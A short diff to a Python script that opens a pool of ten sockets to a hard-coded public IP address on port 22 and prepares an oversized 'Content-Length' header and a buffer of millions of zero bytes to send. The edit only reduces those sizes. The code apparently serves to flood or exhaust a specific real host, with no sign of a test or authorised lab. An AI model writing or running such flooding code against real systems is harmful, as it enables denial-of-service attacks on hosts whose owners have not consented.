@@ -2,7 +2,7 @@ import socket
 
 HOST = "23.227.146.106"
 PORT = 22
-HEADERS = "Content-Length: 999999999\r\nContent-Type: text/plain\r\n\r\n"
+HEADERS = "Content-Length: 9999999\r\nContent-Type: text/plain\r\n\r\n"
 POOL_SIZE = 10
 
 # Create a pool of sockets
@@ -12,7 +12,7 @@ for i in range(POOL_SIZE):
     pool.append(client)
 
 # Fill the message buffer with 0s
-message = b'0' * 999999999
+message = b'0' * 9999999
 
 # Select a socket from the pool
 pool_index = 0
